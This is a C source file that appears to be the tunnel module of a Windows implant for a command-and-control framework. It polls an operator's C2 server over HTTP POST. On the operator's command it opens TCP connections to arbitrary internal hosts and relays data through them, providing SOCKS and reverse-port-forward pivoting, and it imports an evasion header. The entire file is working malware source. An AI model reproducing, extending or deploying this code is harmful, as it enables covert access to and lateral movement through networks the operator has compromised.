/**
 * tunnel.c - C2 tunnel client for operator SOCKS / rportfwd relay
 *
 * POST /api/v1/tunnel with session_id + outbound frames; receive pending frames.
 */
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include "../../include/config.h"
#include "../../include/transport.h"
#include "../../include/tunnel.h"
#include "../../include/base64.h"
#include "../../include/json.h"
#include "../../include/evasion.h"

#pragma comment(lib, "ws2_32.lib")

#define TUNNEL_OP_OPEN  0
#define TUNNEL_OP_DATA  1
#define TUNNEL_OP_CLOSE 2
#define MAX_TUNNEL_CH   32
#define TUNNEL_BUF      65536

typedef struct {
    DWORD   channel_id;
    SOCKET  sock;
    BOOL    active;
    HANDLE  thread;
    CRITICAL_SECTION cs;
} TUNNEL_CHANNEL;

static TUNNEL_CHANNEL g_channels[MAX_TUNNEL_CH];
static CRITICAL_SECTION g_lock;
static BOOL g_initialized = FALSE;
static PIMPLANT_CONFIG g_cfg = NULL;

static char g_out_json[TUNNEL_BUF];
static DWORD g_out_json_len = 0;
static DWORD g_out_frame_count = 0;

static int json_step(int *pos, char *buf, int cap, int n) {
    if (n < 0 || *pos + n >= cap) return -1;
    *pos += n;
    return 0;
}

static int json_comma(int *pos, char *buf, int cap) {
    if (*pos + 1 >= cap) return -1;
    buf[(*pos)++] = ',';
    return 0;
}

static int build_frame_json(char *buf, int cap, DWORD ch, int op, const char *b64,
                            const char *host, DWORD port) {
    int pos = 0;
    if (pos + 1 >= cap) return -1;
    buf[pos++] = '{';

    if (json_step(&pos, buf, cap, json_emit_kv_int(buf + pos, cap - pos, "channel_id", (int)ch)) < 0)
        return -1;
    if (json_comma(&pos, buf, cap) < 0) return -1;
    if (json_step(&pos, buf, cap, json_emit_kv_int(buf + pos, cap - pos, "op", op)) < 0)
        return -1;
    if (json_comma(&pos, buf, cap) < 0) return -1;
    if (json_step(&pos, buf, cap, json_emit_kv(buf + pos, cap - pos, "payload", b64 ? b64 : "")) < 0)
        return -1;

    if (host && host[0]) {
        if (json_comma(&pos, buf, cap) < 0) return -1;
        if (json_step(&pos, buf, cap, json_emit_kv(buf + pos, cap - pos, "target_host", host)) < 0)
            return -1;
        if (json_comma(&pos, buf, cap) < 0) return -1;
        if (json_step(&pos, buf, cap, json_emit_kv_int(buf + pos, cap - pos, "target_port", (int)port)) < 0)
            return -1;
    }

    if (pos + 1 >= cap) return -1;
    buf[pos++] = '}';
    buf[pos] = '\0';
    return pos;
}

static int build_tunnel_body(char *body, int cap, const char *session_id, const char *frames_json) {
    int pos = 0;
    if (pos + 1 >= cap) return -1;
    body[pos++] = '{';

    if (json_step(&pos, body, cap, json_emit_kv(body + pos, cap - pos, "session_id", session_id)) < 0)
        return -1;
    if (json_comma(&pos, body, cap) < 0) return -1;

    {
        char frames_raw[TUNNEL_BUF + 16];
        if (frames_json && frames_json[0]) {
            int fn = _snprintf(frames_raw, sizeof(frames_raw), "[%s]", frames_json);
            if (fn < 0 || fn >= (int)sizeof(frames_raw)) return -1;
        } else {
            lstrcpynA(frames_raw, "[]", sizeof(frames_raw));
        }
        if (json_step(&pos, body, cap, json_emit_kv_raw(body + pos, cap - pos, "frames", frames_raw)) < 0)
            return -1;
    }

    if (pos + 1 >= cap) return -1;
    body[pos++] = '}';
    body[pos] = '\0';
    return pos;
}

static TUNNEL_CHANNEL *find_channel(DWORD id) {
    for (int i = 0; i < MAX_TUNNEL_CH; i++) {
        if (g_channels[i].active && g_channels[i].channel_id == id)
            return &g_channels[i];
    }
    return NULL;
}

static TUNNEL_CHANNEL *alloc_channel(DWORD id) {
    for (int i = 0; i < MAX_TUNNEL_CH; i++) {
        if (!g_channels[i].active) {
            g_channels[i].channel_id = id;
            g_channels[i].sock = INVALID_SOCKET;
            g_channels[i].thread = NULL;
            g_channels[i].active = TRUE;
            return &g_channels[i];
        }
    }
    return NULL;
}

static void enqueue_out_frame(DWORD ch, int op, const BYTE *payload, DWORD plen,
                              const char *host, DWORD port) {
    EnterCriticalSection(&g_lock);
    if (g_out_frame_count >= MAX_TUNNEL_QUEUE) {
        LeaveCriticalSection(&g_lock);
        return;
    }
    if (g_out_json_len + 512 >= TUNNEL_BUF - 1) {
        LeaveCriticalSection(&g_lock);
        return;
    }
    char b64[8192];
    b64[0] = '\0';
    if (payload && plen > 0 && plen < 6000)
        b64_encode(payload, plen, b64, sizeof(b64));

    char frag[1024];
    int n = build_frame_json(frag, sizeof(frag), ch, op, b64, host, port);
    if (n < 0) {
        LeaveCriticalSection(&g_lock);
        return;
    }

    if (g_out_json_len == 0) {
        if ((DWORD)n >= sizeof(g_out_json)) {
            LeaveCriticalSection(&g_lock);
            return;
        }
        CopyMemory(g_out_json, frag, (DWORD)n);
        g_out_json[n] = '\0';
        g_out_json_len = (DWORD)n;
    } else {
        char tmp[TUNNEL_BUF];
        int tn = _snprintf(tmp, sizeof(tmp), "%s,%s", g_out_json, frag);
        if (tn < 0 || tn >= (int)sizeof(tmp)) {
            LeaveCriticalSection(&g_lock);
            return;
        }
        lstrcpynA(g_out_json, tmp, TUNNEL_BUF);
        g_out_json_len = (DWORD)lstrlenA(g_out_json);
    }
    g_out_frame_count++;
    LeaveCriticalSection(&g_lock);
}

static DWORD WINAPI tunnel_relay_thread(LPVOID param) {
    TUNNEL_CHANNEL *ch = (TUNNEL_CHANNEL *)param;
    BYTE buf[8192];
    while (1) {
        SOCKET s;
        EnterCriticalSection(&ch->cs);
        if (!ch->active || ch->sock == INVALID_SOCKET) {
            LeaveCriticalSection(&ch->cs);
            break;
        }
        s = ch->sock;
        LeaveCriticalSection(&ch->cs);

        int n = recv(s, (char *)buf, sizeof(buf), 0);
        if (n <= 0) {
            enqueue_out_frame(ch->channel_id, TUNNEL_OP_CLOSE, NULL, 0, NULL, 0);
            break;
        }
        enqueue_out_frame(ch->channel_id, TUNNEL_OP_DATA, buf, (DWORD)n, NULL, 0);
    }
    EnterCriticalSection(&ch->cs);
    if (ch->sock != INVALID_SOCKET) {
        closesocket(ch->sock);
        ch->sock = INVALID_SOCKET;
    }
    ch->active = FALSE;
    LeaveCriticalSection(&ch->cs);
    return 0;
}

static BOOL tunnel_open(DWORD ch_id, const char *host, DWORD port) {
    if (find_channel(ch_id)) return TRUE;

    TUNNEL_CHANNEL *ch = alloc_channel(ch_id);
    if (!ch) return FALSE;

    struct addrinfo hints, *res = NULL, *rp;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[16];
    _snprintf(port_str, sizeof(port_str), "%lu", port);

    if (getaddrinfo(host, port_str, &hints, &res) != 0) {
        ch->active = FALSE;
        return FALSE;
    }

    SOCKET s = INVALID_SOCKET;
    for (rp = res; rp; rp = rp->ai_next) {
        s = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (s == INVALID_SOCKET) continue;
        if (connect(s, rp->ai_addr, (int)rp->ai_addrlen) == 0) break;
        closesocket(s);
        s = INVALID_SOCKET;
    }
    freeaddrinfo(res);

    if (s == INVALID_SOCKET) {
        ch->active = FALSE;
        return FALSE;
    }

    ch->sock = s;
    ch->thread = jager_create_thread(NULL, 0, tunnel_relay_thread, ch, 0, NULL);
    return ch->thread != NULL;
}

static void tunnel_data(DWORD ch_id, const BYTE *data, DWORD len) {
    TUNNEL_CHANNEL *ch = find_channel(ch_id);
    if (!ch) return;
    EnterCriticalSection(&ch->cs);
    if (ch->active && ch->sock != INVALID_SOCKET)
        send(ch->sock, (const char *)data, (int)len, 0);
    LeaveCriticalSection(&ch->cs);
}

static void tunnel_close(DWORD ch_id) {
    TUNNEL_CHANNEL *ch = find_channel(ch_id);
    if (!ch) return;
    EnterCriticalSection(&ch->cs);
    ch->active = FALSE;
    if (ch->sock != INVALID_SOCKET) {
        closesocket(ch->sock);
        ch->sock = INVALID_SOCKET;
    }
    LeaveCriticalSection(&ch->cs);
}

static void process_inbound_frames(const char *json) {
    const char *arr = strstr(json, "\"frames\":[");
    if (!arr) return;
    arr += 10;

    const char *p = arr;
    while (*p && *p != ']') {
        while (*p && *p != '{') p++;
        if (*p != '{') break;
        const char *end = strchr(p, '}');
        if (!end) break;

        char obj[4096];
        DWORD olen = (DWORD)(end - p + 1);
        if (olen >= sizeof(obj)) olen = sizeof(obj) - 1;
        CopyMemory(obj, p, olen);
        obj[olen] = '\0';

        DWORD ch = json_find_uint(obj, "channel_id");
        int op = (int)json_find_uint(obj, "op");
        char host[256] = {0}, b64[8192] = {0};
        json_find_string(obj, "target_host", host, sizeof(host));
        DWORD port = json_find_uint(obj, "target_port");
        json_find_string(obj, "payload", b64, sizeof(b64));

        BYTE payload[8192];
        DWORD plen = 0;
        if (b64[0]) plen = b64_decode(b64, (DWORD)lstrlenA(b64), payload, sizeof(payload));

        switch (op) {
        case TUNNEL_OP_OPEN:
            if (!tunnel_open(ch, host, port))
                enqueue_out_frame(ch, TUNNEL_OP_CLOSE, NULL, 0, NULL, 0);
            else
                enqueue_out_frame(ch, TUNNEL_OP_DATA, NULL, 0, NULL, 0);
            break;
        case TUNNEL_OP_DATA:
            tunnel_data(ch, payload, plen);
            break;
        case TUNNEL_OP_CLOSE:
            tunnel_close(ch);
            break;
        }
        p = end + 1;
    }
}

BOOL tunnel_init(PIMPLANT_CONFIG config) {
    if (g_initialized) return TRUE;
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;
    InitializeCriticalSection(&g_lock);
    ZeroMemory(g_channels, sizeof(g_channels));
    for (int i = 0; i < MAX_TUNNEL_CH; i++) {
        g_channels[i].sock = INVALID_SOCKET;
        InitializeCriticalSection(&g_channels[i].cs);
    }
    g_out_json[0] = '\0';
    g_out_json_len = 0;
    g_out_frame_count = 0;
    g_cfg = config;
    g_initialized = TRUE;
    return TRUE;
}

void tunnel_cleanup(void) {
    if (!g_initialized) return;
    for (int i = 0; i < MAX_TUNNEL_CH; i++) {
        if (g_channels[i].active)
            tunnel_close(g_channels[i].channel_id);
        DeleteCriticalSection(&g_channels[i].cs);
    }
    DeleteCriticalSection(&g_lock);
    WSACleanup();
    g_initialized = FALSE;
}

BOOL tunnel_poll(PIMPLANT_CONFIG config) {
    if (!g_initialized) tunnel_init(config);

    char body[TUNNEL_BUF];
    char frames_snapshot[TUNNEL_BUF];
    EnterCriticalSection(&g_lock);
    if (g_out_json_len > 0) {
        if (g_out_json_len >= sizeof(frames_snapshot)) {
            LeaveCriticalSection(&g_lock);
            return FALSE;
        }
        CopyMemory(frames_snapshot, g_out_json, g_out_json_len);
        frames_snapshot[g_out_json_len] = '\0';
        g_out_json[0] = '\0';
        g_out_json_len = 0;
        g_out_frame_count = 0;
    } else {
        frames_snapshot[0] = '\0';
    }
    LeaveCriticalSection(&g_lock);

    if (build_tunnel_body(body, sizeof(body), config->implant_id, frames_snapshot[0] ? frames_snapshot : NULL) < 0)
        return FALSE;

    if (!config->tunnel_path[0])
        lstrcpynA(config->tunnel_path, C2_TUNNEL_PATH, sizeof(config->tunnel_path));

    PHTTP_RESPONSE resp = http_post(config->c2_url, config->tunnel_path,
                                  (BYTE *)body, (DWORD)lstrlenA(body), config->user_agent);
    if (!resp || resp->status_code != 200) {
        if (resp) http_response_free(resp);
        return FALSE;
    }

    if (resp->data && resp->size > 0)
        process_inbound_frames((const char *)resp->data);

    http_response_free(resp);
    return TRUE;
}
